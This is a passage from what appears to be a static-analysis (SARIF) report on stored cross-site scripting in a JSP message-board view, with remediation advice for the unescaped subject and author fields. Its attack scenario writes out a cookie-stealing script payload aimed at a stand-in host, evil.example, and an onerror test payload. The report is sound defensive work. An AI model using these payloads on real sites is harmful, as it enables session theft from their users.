      "results": [
        {
          "ruleId": "cross-site-scripting/persistent",
          "level": "error",
          "message": {
            "text": "At line 17 of read.jsp, the JSP EL expression ${msg.subject} is rendered directly inside an <h4> element with no HTML encoding:\n\n<h4>${msg.subject}</h4>\n\nThe subject field originates from the subject HTTP request parameter supplied in the compose form POST (MessageController.composeSubmit → MessageDAO.post()) and is stored verbatim in the database. When retrieved via MessageDAO.read() and placed into the Spring MVC model, it is rendered here without any output escaping.\n\nJSP EL expressions (${...}) do not perform automatic HTML encoding. Only <c:out value=\"${msg.subject}\"/> or ${fn:escapeXml(msg.subject)} would encode HTML metacharacters. Because neither is used, any HTML or JavaScript injected into the subject field at post time is reproduced verbatim in every reader's browser, constituting stored (persistent) Cross-Site Scripting.\n\nAttack scenario: An authenticated user posts a message with the subject <script>document.location='https://evil.example/steal?c='+document.cookie</script>. Every user who views the message has their session cookie exfiltrated.",
            "markdown": "At line 17 of `read.jsp`, the JSP EL expression `${msg.subject}` is rendered directly inside an `<h4>` element with no HTML encoding:\n\n```jsp\n<h4>${msg.subject}</h4>\n```\n\nThe `subject` field originates from the `subject` HTTP request parameter supplied in the compose form POST (`MessageController.composeSubmit` → `MessageDAO.post()`) and is stored verbatim in the database. When retrieved via `MessageDAO.read()` and placed into the Spring MVC model, it is rendered here without any output escaping.\n\nJSP EL expressions (`${...}`) do **not** perform automatic HTML encoding. Only `<c:out value=\"${msg.subject}\"/>` or `${fn:escapeXml(msg.subject)}` would encode HTML metacharacters. Because neither is used, any HTML or JavaScript injected into the subject field at post time is reproduced verbatim in every reader's browser, constituting stored (persistent) Cross-Site Scripting.\n\n**Attack scenario:** An authenticated user posts a message with the subject `<script>document.location='https://evil.example/steal?c='+document.cookie</script>`. Every user who views the message has their session cookie exfiltrated."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "src/main/webapp/WEB-INF/views/messages/read.jsp"
                },
                "region": {
                  "startLine": 17,
                  "snippet": {
                    "text": "                    </a>\n                </div>\n                <div class=\"column is-9\">\n                    <div class=\"box content\">\n                        <article class=\"readheader\">\n                            <h4>${msg.subject}</h4>\n                            <div class=\"media\">\n                                <div class=\"media-content\">\n                                    <div class=\"content\">\n                                        by ${msg.author} on ${msg.timestamp}\n                                    </div>"
                  }
                }
              }
            }
          ],
          "fingerprints": {
            "fortify/instance-id": "6B34CFED4635C63891FA5A9A1B3A7EB8"
          },
          "properties": {
            "impact": 4.5,
            "likelihood": 4.5,
            "snippetStartLine": 12,
            "summary": "Stored XSS: unescaped EL expression ${msg.subject} renders attacker-controlled message subject directly into HTML",
            "remediationSummary": "Replace ${msg.subject} with &lt;c:out value=\"${msg.subject}\"/&gt; or ${fn:escapeXml(msg.subject)} to HTML-encode the value before rendering.",
            "remediation": "Replace the bare EL expression with the JSTL output tag that HTML-encodes by default:\n\n```jsp\n<h4><c:out value=\"${msg.subject}\"/></h4>\n```\n\nAlternatively use the JSTL EL function:\n\n```jsp\n<h4>${fn:escapeXml(msg.subject)}</h4>\n```\n\nBoth approaches encode `<`, `>`, `&`, `\"`, and `'` before writing to the HTML stream, neutralising any injected markup. Apply the same fix consistently to every other unescaped EL expression in this file (`msg.author`, `msg.body`)."
          }
        },
        {
          "ruleId": "cross-site-scripting/persistent",
          "level": "error",
          "message": {
            "text": "At line 22 of read.jsp, the JSP EL expression ${msg.author} is rendered inside a <div class=\"content\"> element with no HTML encoding:\n\nby ${msg.author} on ${msg.timestamp}\n\nThe author field is populated from the HTTP cookie user (read in MessageController.composeSubmit via @CookieValue(value = \"user\", defaultValue = \"anonymous\") String user) and written directly to the database via MessageDAO.post(). The user cookie is set to whatever username the user successfully authenticated with, but the authentication cookie is set without HttpOnly or Secure flags, and crucially the cookie value itself is user-supplied input (the username parameter from the login form → AuthenticationController.loginSubmit → setCookie).\n\nAn attacker who registers a username containing HTML/JavaScript (e.g., <img src=x onerror=alert(1)>) will have that string stored as the author of every post they submit and will be executed in every reader's browser, constituting stored (persistent) Cross-Site Scripting.\n\nJSP EL ${...} provides no automatic HTML escaping.",
            "markdown": "At line 22 of `read.jsp`, the JSP EL expression `${msg.author}` is rendered inside a `<div class=\"content\">` element with no HTML encoding:\n\n```jsp\nby ${msg.author} on ${msg.timestamp}\n```\n\nThe `author` field is populated from the HTTP cookie `user` (read in `MessageController.composeSubmit` via `@CookieValue(value = \"user\", defaultValue = \"anonymous\") String user`) and written directly to the database via `MessageDAO.post()`. The `user` cookie is set to whatever username the user successfully authenticated with, but the authentication cookie is set without `HttpOnly` or `Secure` flags, and crucially the cookie **value itself** is user-supplied input (the `username` parameter from the login form → `AuthenticationController.loginSubmit` → `setCookie`).\n\nAn attacker who registers a username containing HTML/JavaScript (e.g., `<img src=x onerror=alert(1)>`) will have that string stored as the `author` of every post they submit and will be executed in every reader's browser, constituting stored (persistent) Cross-Site Scripting.\n\nJSP EL `${...}` provides no automatic HTML escaping."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
